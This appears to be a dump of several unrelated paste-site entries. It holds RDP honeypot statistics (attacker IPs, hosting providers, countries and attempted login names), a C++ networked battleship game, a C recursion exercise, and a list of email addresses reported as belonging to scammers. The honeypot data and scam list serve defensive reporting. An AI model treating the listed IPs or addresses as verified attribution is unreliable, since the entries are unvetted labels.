    ""AS4766"": 3,
    ""AS25227"": 3,
    ""AS57523"": 12,
    ""AS5631"": 3,
    ""AS201634"": 3,
    ""AS12876"": 3,
    ""Unknown"": 18,
    ""AS396948"": 9,
    ""AS140599"": 3,
    ""AS4134"": 3
  },
  ""isp"": {
    ""OVH SAS"": 18,
    ""Microsoft"": 6,
    ""Xhost Internet Solutions LP"": 27,
    ""Censys, Inc."": 6,
    ""Google LLC"": 36,
    ""PT Telekomunikasi Indonesia"": 6,
    ""ColoCrossing"": 15,
    ""SS-Net"": 9,
    ""Microsoft Corporation"": 36,
    ""Turunc Smart Bilgisayar Teknoloji Ve Dis Ticaret Limited Sirketi"": 9,
    ""UAB Host Baltic"": 6,
    ""BtHoster LTD"": 3,
    ""Horizon LLC"": 21,
    ""Proton66 OOO"": 3,
    ""DigitalOcean, LLC"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""China Mobile communications corporation"": 3,
    ""Korea Telecom"": 3,
    ""AVANTEL"": 3,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Luminet Data Limited"": 3,
    ""Mizban Dade Shetaban"": 3,
    ""Online"": 3,
    ""Gstech Software Systems Pvt Ltd"": 18,
    ""Kamatera"": 9,
    ""Comfac Corporation"": 3,
    ""Chinanet"": 3
  },
  ""org"": {
    ""OVH Ltd"": 18,
    ""Microsoft Azure Cloud (southeastasia)"": 6,
    ""Xhost Internet Solutions"": 18,
    ""Censys, Inc"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Telekomunikasi Indonesia"": 6,
    ""New Wave NetConnect, LLC"": 15,
    ""Xhostis"": 6,
    ""4Media Ltd"": 9,
    ""Microsoft Azure Cloud (northeurope)"": 36,
    ""Turunc smart bilgisayar Teknoloji ve dis ticaret limited"": 9,
    ""Unknown"": 15,
    ""BtHoster LTD"": 3,
    ""Horizon LLC"": 21,
    ""Proton66 LLC"": 3,
    ""DigitalOcean, LLC"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""China Mobile"": 3,
    ""Kornet"": 3,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Starcrecium Limited"": 6,
    ""Dmitriy Panchenko"": 3,
    ""Free SAS"": 3,
    ""Gstech Software Systems Pvt Ltd"": 18,
    ""Cloud Web Manage"": 9,
    ""Comfac Corporation"": 3,
    ""Chinanet HE"": 3
  },
  ""regionName"": {
    ""England"": 21,
    ""Central Singapore"": 21,
    ""North Holland"": 33,
    ""Michigan"": 6,
    ""California"": 60,
    ""Jakarta"": 6,
    ""Plovdiv"": 9,
    ""Leinster"": 36,
    ""Kaunas"": 6,
    ""Bavaria"": 3,
    ""Moscow"": 36,
    ""Bangkok"": 3,
    ""Hebei"": 6,
    ""Incheon"": 3,
    ""Moscow Oblast"": 3,
    ""Perm Krai"": 3,
    ""Zanjan"": 3,
    ""\u00cele-de-France"": 3,
    ""Uttar Pradesh"": 18,
    ""Metro Manila"": 3
  },
  ""country"": {
    ""United Kingdom"": 21,
    ""Singapore"": 21,
    ""Netherlands"": 33,
    ""United States"": 66,
    ""Indonesia"": 6,
    ""Bulgaria"": 9,
    ""Ireland"": 36,
    ""Lithuania"": 6,
    ""Germany"": 3,
    ""Russia"": 42,
    ""Thailand"": 3,
    ""China"": 6,
    ""South Korea"": 3,
    ""Iran"": 3,
    ""France"": 3,
    ""India"": 18,
    ""Philippines"": 3
  },
  ""account"": {
    ""Test"": 27,
    ""hello"": 117,
    ""Administr"": 33,
    ""(empty)"": 21,
    ""zurZJxKVY"": 3,
    ""ExwrFJ"": 3,
    ""nEgnPv"": 3,
    ""Domain"": 39,
    ""vxtZYyBUu"": 3,
    ""HnLIrb"": 3,
    ""zmMUGQ"": 3,
    ""Administrator"": 3,
    ""QfuonNj"": 3,
    ""HxwFCNxkv"": 3,
    ""jDgTKL"": 3,
    ""UPdyXB"": 3,
    ""nmap"": 3,
    ""gzljzZXOo"": 3,
    ""XloPTN"": 3,
    ""ntSvFe"": 3
  },
  ""keyboard"": {
    ""Unknown"": 282
  },
  ""client_build"": {
    ""Unknown"": 282
  },
  ""client_name"": {
    ""Unknown"": 282
  },
  ""ip_type"": {
    ""hosting"": 117,
    ""Unknown"": 123,
    ""proxy"": 9,
    ""hosting & proxy"": 18,
    ""mobile"": 15
  }
}"
pxXDHcdm,2023-11-09_stats.json,rdp_snitch,JSON,Thursday 9th of November 2023 06:16:10 PM CDT,"{
  ""ip"": {
    ""51.75.160.42"": 12,
    ""172.188.48.214"": 4,
    ""87.251.75.145"": 4,
    ""167.94.138.52"": 2,
    ""167.94.138.36"": 2,
    ""205.210.31.22"": 6,
    ""36.91.222.100"": 4,
    ""107.175.137.135"": 10,
    ""185.170.144.3"": 4,
    ""212.70.149.146"": 6,
    ""87.251.75.120"": 2,
    ""198.235.24.195"": 6,
    ""13.94.102.91"": 24,
    ""45.252.182.90"": 6,
    ""141.98.11.128"": 4,
    ""77.90.185.132"": 2,
    ""62.204.41.146"": 14,
    ""45.140.17.16"": 2,
    ""206.189.91.84"": 10,
    ""165.154.119.158"": 2,
    ""111.61.253.55"": 2,
    ""61.85.244.232"": 2,
    ""62.68.147.43"": 2,
    ""62.122.184.165"": 4,
    ""152.89.198.133"": 4,
    ""205.210.31.158"": 6,
    ""79.173.173.37"": 2,
    ""87.251.75.64"": 2,
    ""94.232.41.30"": 2,
    ""87.107.190.135"": 2,
    ""212.83.189.163"": 2,
    ""103.212.136.125"": 12,
    ""87.251.75.179"": 4,
    ""104.128.67.122"": 6,
    ""198.235.24.151"": 6,
    ""103.56.6.170"": 2,
    ""106.116.169.71"": 2
  },
  ""asn"": {
    ""AS16276"": 12,
    ""AS8075"": 28,
    ""AS208091"": 14,
    ""AS398324"": 4,
    ""AS396982"": 24,
    ""AS7713"": 4,
    ""AS36352"": 10,
    ""AS197414"": 4,
    ""AS204428"": 6,
    ""AS48011"": 6,
    ""AS209605"": 4,
    ""AS198465"": 2,
    ""AS59425"": 14,
    ""AS198953"": 2,
    ""AS14061"": 10,
    ""AS135377"": 2,
    ""AS24547"": 2,
    ""AS4766"": 2,
    ""AS25227"": 2,
    ""AS57523"": 8,
    ""AS5631"": 2,
    ""AS201634"": 2,
    ""AS12876"": 2,
    ""Unknown"": 12,
    ""AS396948"": 6,
    ""AS140599"": 2,
    ""AS4134"": 2
  },
  ""isp"": {
    ""OVH SAS"": 12,
    ""Microsoft"": 4,
    ""Xhost Internet Solutions LP"": 18,
    ""Censys, Inc."": 4,
    ""Google LLC"": 24,
    ""PT Telekomunikasi Indonesia"": 4,
    ""ColoCrossing"": 10,
    ""SS-Net"": 6,
    ""Microsoft Corporation"": 24,
    ""Turunc Smart Bilgisayar Teknoloji Ve Dis Ticaret Limited Sirketi"": 6,
    ""UAB Host Baltic"": 4,
    ""BtHoster LTD"": 2,
    ""Horizon LLC"": 14,
    ""Proton66 OOO"": 2,
    ""DigitalOcean, LLC"": 10,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Mobile communications corporation"": 2,
    ""Korea Telecom"": 2,
    ""AVANTEL"": 2,
    ""Chang Way Technologies Co. Limited"": 8,
    ""Luminet Data Limited"": 2,
    ""Mizban Dade Shetaban"": 2,
    ""Online"": 2,
    ""Gstech Software Systems Pvt Ltd"": 12,
    ""Kamatera"": 6,
    ""Comfac Corporation"": 2,
    ""Chinanet"": 2
  },
  ""org"": {
    ""OVH Ltd"": 12,
    ""Microsoft Azure Cloud (southeastasia)"": 4,
    ""Xhost Internet Solutions"": 12,
    ""Censys, Inc"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Telekomunikasi Indonesia"": 4,
    ""New Wave NetConnect, LLC"": 10,
    ""Xhostis"": 4,
    ""4Media Ltd"": 6,
    ""Microsoft Azure Cloud (northeurope)"": 24,
    ""Turunc smart bilgisayar Teknoloji ve dis ticaret limited"": 6,
    ""Unknown"": 10,
    ""BtHoster LTD"": 2,
    ""Horizon LLC"": 14,
    ""Proton66 LLC"": 2,
    ""DigitalOcean, LLC"": 10,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""China Mobile"": 2,
    ""Kornet"": 2,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Starcrecium Limited"": 4,
    ""Dmitriy Panchenko"": 2,
    ""Free SAS"": 2,
    ""Gstech Software Systems Pvt Ltd"": 12,
    ""Cloud Web Manage"": 6,
    ""Comfac Corporation"": 2,
    ""Chinanet HE"": 2
  },
  ""regionName"": {
    ""England"": 14,
    ""Central Singapore"": 14,
    ""North Holland"": 22,
    ""Michigan"": 4,
    ""California"": 40,
    ""Jakarta"": 4,
    ""Plovdiv"": 6,
    ""Leinster"": 24,
    ""Kaunas"": 4,
    ""Bavaria"": 2,
    ""Moscow"": 24,
    ""Bangkok"": 2,
    ""Hebei"": 4,
    ""Incheon"": 2,
    ""Moscow Oblast"": 2,
    ""Perm Krai"": 2,
    ""Zanjan"": 2,
    ""\u00cele-de-France"": 2,
    ""Uttar Pradesh"": 12,
    ""Metro Manila"": 2
  },
  ""country"": {
    ""United Kingdom"": 14,
    ""Singapore"": 14,
    ""Netherlands"": 22,
    ""United States"": 44,
    ""Indonesia"": 4,
    ""Bulgaria"": 6,
    ""Ireland"": 24,
    ""Lithuania"": 4,
    ""Germany"": 2,
    ""Russia"": 28,
    ""Thailand"": 2,
    ""China"": 4,
    ""South Korea"": 2,
    ""Iran"": 2,
    ""France"": 2,
    ""India"": 12,
    ""Philippines"": 2
  },
  ""account"": {
    ""Test"": 18,
    ""hello"": 78,
    ""Administr"": 22,
    ""(empty)"": 14,
    ""zurZJxKVY"": 2,
    ""ExwrFJ"": 2,
    ""nEgnPv"": 2,
    ""Domain"": 26,
    ""vxtZYyBUu"": 2,
    ""HnLIrb"": 2,
    ""zmMUGQ"": 2,
    ""Administrator"": 2,
    ""QfuonNj"": 2,
    ""HxwFCNxkv"": 2,
    ""jDgTKL"": 2,
    ""UPdyXB"": 2,
    ""nmap"": 2,
    ""gzljzZXOo"": 2,
    ""XloPTN"": 2,
    ""ntSvFe"": 2
  },
  ""keyboard"": {
    ""Unknown"": 188
  },
  ""client_build"": {
    ""Unknown"": 188
  },
  ""client_name"": {
    ""Unknown"": 188
  },
  ""ip_type"": {
    ""hosting"": 78,
    ""Unknown"": 82,
    ""proxy"": 6,
    ""hosting & proxy"": 12,
    ""mobile"": 10
  }
}"
xU6C5gLJ,2023-11-09_stats.json,rdp_snitch,JSON,Thursday 9th of November 2023 06:15:08 PM CDT,"{
  ""ip"": {
    ""51.75.160.42"": 6,
    ""172.188.48.214"": 2,
    ""87.251.75.145"": 2,
    ""167.94.138.52"": 1,
    ""167.94.138.36"": 1,
    ""205.210.31.22"": 3,
    ""36.91.222.100"": 2,
    ""107.175.137.135"": 5,
    ""185.170.144.3"": 2,
    ""212.70.149.146"": 3,
    ""87.251.75.120"": 1,
    ""198.235.24.195"": 3,
    ""13.94.102.91"": 12,
    ""45.252.182.90"": 3,
    ""141.98.11.128"": 2,
    ""77.90.185.132"": 1,
    ""62.204.41.146"": 7,
    ""45.140.17.16"": 1,
    ""206.189.91.84"": 5,
    ""165.154.119.158"": 1,
    ""111.61.253.55"": 1,
    ""61.85.244.232"": 1,
    ""62.68.147.43"": 1,
    ""62.122.184.165"": 2,
    ""152.89.198.133"": 2,
    ""205.210.31.158"": 3,
    ""79.173.173.37"": 1,
    ""87.251.75.64"": 1,
    ""94.232.41.30"": 1,
    ""87.107.190.135"": 1,
    ""212.83.189.163"": 1,
    ""103.212.136.125"": 6,
    ""87.251.75.179"": 2,
    ""104.128.67.122"": 3,
    ""198.235.24.151"": 3,
    ""103.56.6.170"": 1,
    ""106.116.169.71"": 1
  },
  ""asn"": {
    ""AS16276"": 6,
    ""AS8075"": 14,
    ""AS208091"": 7,
    ""AS398324"": 2,
    ""AS396982"": 12,
    ""AS7713"": 2,
    ""AS36352"": 5,
    ""AS197414"": 2,
    ""AS204428"": 3,
    ""AS48011"": 3,
    ""AS209605"": 2,
    ""AS198465"": 1,
    ""AS59425"": 7,
    ""AS198953"": 1,
    ""AS14061"": 5,
    ""AS135377"": 1,
    ""AS24547"": 1,
    ""AS4766"": 1,
    ""AS25227"": 1,
    ""AS57523"": 4,
    ""AS5631"": 1,
    ""AS201634"": 1,
    ""AS12876"": 1,
    ""Unknown"": 6,
    ""AS396948"": 3,
    ""AS140599"": 1,
    ""AS4134"": 1
  },
  ""isp"": {
    ""OVH SAS"": 6,
    ""Microsoft"": 2,
    ""Xhost Internet Solutions LP"": 9,
    ""Censys, Inc."": 2,
    ""Google LLC"": 12,
    ""PT Telekomunikasi Indonesia"": 2,
    ""ColoCrossing"": 5,
    ""SS-Net"": 3,
    ""Microsoft Corporation"": 12,
    ""Turunc Smart Bilgisayar Teknoloji Ve Dis Ticaret Limited Sirketi"": 3,
    ""UAB Host Baltic"": 2,
    ""BtHoster LTD"": 1,
    ""Horizon LLC"": 7,
    ""Proton66 OOO"": 1,
    ""DigitalOcean, LLC"": 5,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""China Mobile communications corporation"": 1,
    ""Korea Telecom"": 1,
    ""AVANTEL"": 1,
    ""Chang Way Technologies Co. Limited"": 4,
    ""Luminet Data Limited"": 1,
    ""Mizban Dade Shetaban"": 1,
    ""Online"": 1,
    ""Gstech Software Systems Pvt Ltd"": 6,
    ""Kamatera"": 3,
    ""Comfac Corporation"": 1,
    ""Chinanet"": 1
  },
  ""org"": {
    ""OVH Ltd"": 6,
    ""Microsoft Azure Cloud (southeastasia)"": 2,
    ""Xhost Internet Solutions"": 6,
    ""Censys, Inc"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Telekomunikasi Indonesia"": 2,
    ""New Wave NetConnect, LLC"": 5,
    ""Xhostis"": 2,
    ""4Media Ltd"": 3,
    ""Microsoft Azure Cloud (northeurope)"": 12,
    ""Turunc smart bilgisayar Teknoloji ve dis ticaret limited"": 3,
    ""Unknown"": 5,
    ""BtHoster LTD"": 1,
    ""Horizon LLC"": 7,
    ""Proton66 LLC"": 1,
    ""DigitalOcean, LLC"": 5,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""China Mobile"": 1,
    ""Kornet"": 1,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Starcrecium Limited"": 2,
    ""Dmitriy Panchenko"": 1,
    ""Free SAS"": 1,
    ""Gstech Software Systems Pvt Ltd"": 6,
    ""Cloud Web Manage"": 3,
    ""Comfac Corporation"": 1,
    ""Chinanet HE"": 1
  },
  ""regionName"": {
    ""England"": 7,
    ""Central Singapore"": 7,
    ""North Holland"": 11,
    ""Michigan"": 2,
    ""California"": 20,
    ""Jakarta"": 2,
    ""Plovdiv"": 3,
    ""Leinster"": 12,
    ""Kaunas"": 2,
    ""Bavaria"": 1,
    ""Moscow"": 12,
    ""Bangkok"": 1,
    ""Hebei"": 2,
    ""Incheon"": 1,
    ""Moscow Oblast"": 1,
    ""Perm Krai"": 1,
    ""Zanjan"": 1,
    ""\u00cele-de-France"": 1,
    ""Uttar Pradesh"": 6,
    ""Metro Manila"": 1
  },
  ""country"": {
    ""United Kingdom"": 7,
    ""Singapore"": 7,
    ""Netherlands"": 11,
    ""United States"": 22,
    ""Indonesia"": 2,
    ""Bulgaria"": 3,
    ""Ireland"": 12,
    ""Lithuania"": 2,
    ""Germany"": 1,
    ""Russia"": 14,
    ""Thailand"": 1,
    ""China"": 2,
    ""South Korea"": 1,
    ""Iran"": 1,
    ""France"": 1,
    ""India"": 6,
    ""Philippines"": 1
  },
  ""account"": {
    ""Test"": 9,
    ""hello"": 39,
    ""Administr"": 11,
    ""(empty)"": 7,
    ""zurZJxKVY"": 1,
    ""ExwrFJ"": 1,
    ""nEgnPv"": 1,
    ""Domain"": 13,
    ""vxtZYyBUu"": 1,
    ""HnLIrb"": 1,
    ""zmMUGQ"": 1,
    ""Administrator"": 1,
    ""QfuonNj"": 1,
    ""HxwFCNxkv"": 1,
    ""jDgTKL"": 1,
    ""UPdyXB"": 1,
    ""nmap"": 1,
    ""gzljzZXOo"": 1,
    ""XloPTN"": 1,
    ""ntSvFe"": 1
  },
  ""keyboard"": {
    ""Unknown"": 94
  },
  ""client_build"": {
    ""Unknown"": 94
  },
  ""client_name"": {
    ""Unknown"": 94
  },
  ""ip_type"": {
    ""hosting"": 39,
    ""Unknown"": 41,
    ""proxy"": 3,
    ""hosting & proxy"": 6,
    ""mobile"": 5
  }
}"
ifbjvRHA,Untitled,savva_morozov,C++,Thursday 9th of November 2023 05:59:11 PM CDT,"#ifdef WIN32
#include <sdkddkver.h>
#endif

#include ""seabattle.h""

#include <atomic>
#include <boost/asio.hpp>
#include <boost/array.hpp>
#include <iostream>
#include <optional>
#include <string>
#include <thread>
#include <string_view>

namespace net = boost::asio;
using net::ip::tcp;
using namespace std::literals;

void PrintFieldPair(const SeabattleField& left, const SeabattleField& right) {
    auto left_pad = ""  ""s;
    auto delimeter = ""    ""s;
    std::cout << left_pad;
    SeabattleField::PrintDigitLine(std::cout);
    std::cout << delimeter;
    SeabattleField::PrintDigitLine(std::cout);
    std::cout << std::endl;
    for (size_t i = 0; i < SeabattleField::field_size; ++i) {
        std::cout << left_pad;
        left.PrintLine(std::cout, i);
        std::cout << delimeter;
        right.PrintLine(std::cout, i);
        std::cout << std::endl;
    }
    std::cout << left_pad;
    SeabattleField::PrintDigitLine(std::cout);
    std::cout << delimeter;
    SeabattleField::PrintDigitLine(std::cout);
    std::cout << std::endl;
}

template <size_t sz>
static std::optional<std::string> ReadExact(tcp::socket& socket) {
    boost::array<char, sz> buf;
    boost::system::error_code ec;

    net::read(socket, net::buffer(buf), net::transfer_exactly(sz), ec);

    if (ec) {
        return std::nullopt;
    }

    return {{buf.data(), sz}};
}

static bool WriteExact(tcp::socket& socket, std::string_view data) {
    boost::system::error_code ec;

    net::write(socket, net::buffer(data), net::transfer_exactly(data.size()), ec);

    return !ec;
}

class SeabattleAgent {
public:
    SeabattleAgent(const SeabattleField& field)
        : my_field_(field) {
    }

    void StartGame(tcp::socket& socket, bool my_initiative) {

        try {
            boost::system::error_code ec;
            net::streambuf stream_buf;

            PrintFields();

            while (!IsGameEnded()) {
                if (my_initiative) {
                    std::cout << ""Your turn: ""sv;
                    std::string move_str;
                    std::getline(std::cin, move_str);

                    std::optional<std::pair<int, int>> my_move = ParseMove(move_str);
                    size_t x = my_move.value().first;
                    size_t y = my_move.value().second;

                    SendMove(socket, move_str);
                    
                    SeabattleField::ShotResult shot_result = ReadResult(socket).value();

                    switch(shot_result)
                    {
                        case SeabattleField::ShotResult::MISS: 
                            other_field_.MarkMiss(x, y);
                            my_initiative = !my_initiative;
                            std::cout << ""Miss""sv << std::endl;
                            break;
                        case SeabattleField::ShotResult::HIT: 
                            other_field_.MarkHit(x, y);
                            std::cout << ""Hit""sv << std::endl;
                            break;
                        case SeabattleField::ShotResult::KILL:
                            other_field_.MarkKill(x, y);
                            std::cout << ""Kill""sv << std::endl;
                            break;
                    }

                } else if (!my_initiative) {
                    std::cout << ""Waiting for turn ...""sv << std::endl;
                    auto opponent_move = ReadMove(socket);
                    size_t x = opponent_move.value().first;
                    size_t y = opponent_move.value().second;

                    std::cout << ""Shot to ""sv << MoveToString(opponent_move.value()) << std::endl;

                    SeabattleField::ShotResult shot_result = my_field_.Shoot(x, y);

                    switch(shot_result)
                    {
                        case SeabattleField::ShotResult::MISS: 
                            my_field_.MarkMiss(x, y);
                            my_initiative = !my_initiative;
                            break;
                        case SeabattleField::ShotResult::HIT: 
                            my_field_.MarkHit(x, y);
                            break;
                        case SeabattleField::ShotResult::KILL: 
                            my_field_.MarkKill(x, y);
                            break;
                    }
                    SendResult(socket, shot_result);                    
                }
                PrintFields();
            }
        }  catch (std::exception& e) {
        std::cerr << e.what() << std::endl;
        }
    }

private:
    static std::optional<std::pair<int, int>> ParseMove(const std::string_view& sv) {
        if (sv.size() != 2) return std::nullopt;

        int p1 = sv[0] - 'A', p2 = sv[1] - '1';

        if (p1 < 0 || p1 > 8) return std::nullopt;
        if (p2 < 0 || p2 > 8) return std::nullopt;

        return {{p1, p2}};
    }

    static std::string MoveToString(std::pair<int, int> move) {
        char buff[] = {static_cast<char>(move.first) + 'A', static_cast<char>(move.second) + '1'};
        return {buff, 2};
    }

    void PrintFields() const {
        PrintFieldPair(my_field_, other_field_);
    }

    bool IsGameEnded() const {
        return my_field_.IsLoser() || other_field_.IsLoser();
    }

    std::optional<std::pair<int, int>> ReadMove(tcp::socket& socket) {
        boost::system::error_code ec;
        net::streambuf stream_buf;

        net::read_until(socket, stream_buf, '\n', ec);
        if (ec) {
            std::cout << ""Error reading data ReadMove""sv << std::endl;
        return std::nullopt;
        }

        std::string turn_data_str{std::istreambuf_iterator<char>(&stream_buf),
                                  std::istreambuf_iterator<char>()};

        return ParseMove(turn_data_str);
    }

    std::optional<SeabattleField::ShotResult> ReadResult(tcp::socket& socket) {
        boost::system::error_code ec;
        net::streambuf stream_buf;

        net::read_until(socket, stream_buf, '\n', ec);
        if (ec) {
            std::cout << ""Error reading data ReadResult""sv << std::endl;
        return std::nullopt;
        }

        std::string shot_result_str{std::istreambuf_iterator<char>(&stream_buf),
                                    std::istreambuf_iterator<char>()};

        return static_cast<SeabattleField::ShotResult>(shot_result_str[0]);
    }

    void SendResult(tcp::socket& socket, SeabattleField::ShotResult& shot_result) {
        boost::system::error_code ec;
        std::string s{static_cast<char>(shot_result)};
        s += ""\n""s;
        std::cout << s << std::endl;
        socket.write_some(net::buffer(s), ec);
        if (ec) {
            std::cout << ""Error sending data SendResult""sv << std::endl;
        return;
        }
    }

    void SendMove(tcp::socket& socket, std::string move_str) {
        boost::system::error_code ec;
        move_str += ""\n""s;
        socket.write_some(net::buffer(move_str), ec);
        if (ec) {
            std::cout << ""Error sending data SendMove""sv << std::endl;
        return;
        }
    }

private:
    SeabattleField my_field_;
    SeabattleField other_field_;
};

void StartServer(const SeabattleField& field, unsigned short port) {
    SeabattleAgent agent(field);

    try {
        boost::system::error_code ec;

        net::io_context io_context;

        // используем конструктор tcp::v4 по умолчанию для адреса 0.0.0.0
        tcp::acceptor acceptor(io_context, tcp::endpoint(tcp::v4(), port));
        std::cout << ""Waiting for connection...""sv << std::endl;

        tcp::socket socket{io_context};
        acceptor.accept(socket, ec);

        agent.StartGame(socket, false);

    } catch (std::exception& e) {
        std::cerr << e.what() << std::endl;
    }
};

void StartClient(const SeabattleField& field, const std::string& ip_str, unsigned short port) {
    SeabattleAgent agent(field);

    try {
        boost::system::error_code ec;

        net::io_context io_context;

        auto endpoint = tcp::endpoint(net::ip::make_address(ip_str, ec), port);

        tcp::socket socket{io_context};
        socket.connect(endpoint, ec);

        agent.StartGame(socket, true);

    } catch (std::exception& e) {
        std::cerr << e.what() << std::endl;
    }
};

int main(int argc, const char** argv) {
    if (argc != 3 && argc != 4) {
        std::cout << ""Usage: program <seed> [<ip>] <port>"" << std::endl;
        return 1;
    }

    std::mt19937 engine(std::stoi(argv[1]));
    SeabattleField fieldL = SeabattleField::GetRandomField(engine);

    if (argc == 3) {
        StartServer(fieldL, std::stoi(argv[2]));
    } else if (argc == 4) {
        StartClient(fieldL, argv[2], std::stoi(argv[3]));
    }
}
"
8Zgi2fhG,Esercizi programmazione 1 - rec,informaticage,C,Thursday 9th of November 2023 05:44:25 PM CDT,"#include <stdio.h>

int even(int n) {
  if (n == 0) return 1;
  if (n == 1) return 0;

  return even(n - 2);
}

int summation(int i, int n) {
  if (i == n) return 0;
  return i + summation(i + 1, n);
}

int product(int i, int n) {
  if (i == n) return 1;
  return (i + 1) * product(i + 1, n);
}

int pi(int i, int n) {
  if (i == n + 1) return 0;
  int sum = summation(0, i) * even(i);
  int prod = product(0, i) * (1 - even(i));

  return sum + prod + pi(i + 1, n);
}

int pi_iter(int n) {
  int tot = 0;
  for (int i = 1; i <= n; i++) {
    int sum = summation(0, i) * (i % 2 == 0);
    int prod = product(0, i) * (1 - (i % 2 == 0));

    tot = tot + (sum + prod);
  }

  return tot;
}

int power(int b, int e) {
  int res = 1;
  for (int i = 0; i < e; i++) {
    res = res * b;
  }

  return res;
}

int powrec(int b, int e) {
  if (e == 0) return 1;
  return b * powrec(b, e - 1);
}"
i6Wz4n7f,Nigerian scammers [9-11-3/2023],bombaires,AIMMS,Thursday 9th of November 2023 05:43:06 PM CDT,"<a href=""mailto:fed_paymt_treasury_usa_2013@live.com"">fed_paymt_treasury_usa_2013@live.com</a>
<a href=""mailto:warrenbuffett631@yahoo.com"">warrenbuffett631@yahoo.com</a>
<a href=""mailto:warrenbuffett63@yahoo.com"">warrenbuffett63@yahoo.com</a>
<a href=""mailto:warrenbuffett64@outlook.com"">warrenbuffett64@outlook.com</a>
<a href=""mailto:carla@worldwidebizleads.com"">carla@worldwidebizleads.com</a>
<a href=""mailto:mscarmanlapointe21@gmail.com"">mscarmanlapointe21@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+647@gmail.com"">mscarmanlapointe21+647@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+18783@gmail.com"">mscarmanlapointe21+18783@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29595@gmail.com"">mscarmanlapointe21+29595@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+30429@gmail.com"">mscarmanlapointe21+30429@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+9815@gmail.com"">mscarmanlapointe21+9815@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26693@gmail.com"">mscarmanlapointe21+26693@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+11934@gmail.com"">mscarmanlapointe21+11934@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+27751@gmail.com"">mscarmanlapointe21+27751@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+23640@gmail.com"">mscarmanlapointe21+23640@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13802@gmail.com"">mscarmanlapointe21+13802@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+18608@gmail.com"">mscarmanlapointe21+18608@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3718@gmail.com"">mscarmanlapointe21+3718@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16548@gmail.com"">mscarmanlapointe21+16548@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19640@gmail.com"">mscarmanlapointe21+19640@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+32234@gmail.com"">mscarmanlapointe21+32234@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16900@gmail.com"">mscarmanlapointe21+16900@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+29343@gmail.com"">mscarmanlapointe21+29343@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+28522@gmail.com"">mscarmanlapointe21+28522@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13803@gmail.com"">mscarmanlapointe21+13803@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+23971@gmail.com"">mscarmanlapointe21+23971@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+8152@gmail.com"">mscarmanlapointe21+8152@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+30265@gmail.com"">mscarmanlapointe21+30265@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+32520@gmail.com"">mscarmanlapointe21+32520@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+32056@gmail.com"">mscarmanlapointe21+32056@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+1682@gmail.com"">mscarmanlapointe21+1682@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+26613@gmail.com"">mscarmanlapointe21+26613@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+12407@gmail.com"">mscarmanlapointe21+12407@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+24444@gmail.com"">mscarmanlapointe21+24444@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+31817@gmail.com"">mscarmanlapointe21+31817@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+13745@gmail.com"">mscarmanlapointe21+13745@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+25574@gmail.com"">mscarmanlapointe21+25574@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+5650@gmail.com"">mscarmanlapointe21+5650@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+22368@gmail.com"">mscarmanlapointe21+22368@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+28287@gmail.com"">mscarmanlapointe21+28287@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+24475@gmail.com"">mscarmanlapointe21+24475@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+18745@gmail.com"">mscarmanlapointe21+18745@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+32369@gmail.com"">mscarmanlapointe21+32369@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19093@gmail.com"">mscarmanlapointe21+19093@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+16860@gmail.com"">mscarmanlapointe21+16860@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+10613@gmail.com"">mscarmanlapointe21+10613@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+3521@gmail.com"">mscarmanlapointe21+3521@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+19769@gmail.com"">mscarmanlapointe21+19769@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+25648@gmail.com"">mscarmanlapointe21+25648@gmail.com</a>
<a href=""mailto:mscarmanlapointe21+25842@gmail.com"">mscarmanlapointe21+25842@gmail.com</a>
